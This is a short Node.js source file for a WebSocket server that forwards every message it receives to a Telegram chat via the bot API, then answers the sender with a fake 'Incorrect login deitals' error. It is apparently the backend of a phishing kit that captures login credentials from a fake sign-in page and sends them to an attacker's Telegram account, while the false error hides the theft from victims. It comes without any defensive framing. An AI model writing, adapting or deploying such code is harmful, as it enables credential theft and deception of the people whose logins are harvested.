const WebSocket = require('ws');
const axios = require('axios');
const botToken = 'TOKEN'; // Replace with your bot token
const chatId = 'CHATID'; // Replace with your chat ID

const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws) => {
    console.log('New client connected');

    ws.on('message', async (message) => {
        // Convert the message to a string if it's a Buffer
        const textMessage = Buffer.isBuffer(message) ? message.toString() : message;

        console.log(`Received message: ${textMessage}`);

        try {
            const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: textMessage,
            });
            console.log('Message sent to Telegram:', response.data);
            ws.send('Incorrect login deitals');
        } catch (error) {
            console.error('Error sending message to Telegram:', error);
            ws.send('Error');
        }
    });

    ws.on('close', () => {
        console.log('Client disconnected');
    });
});

console.log('WebSocket server is running on ws://localhost:8080');
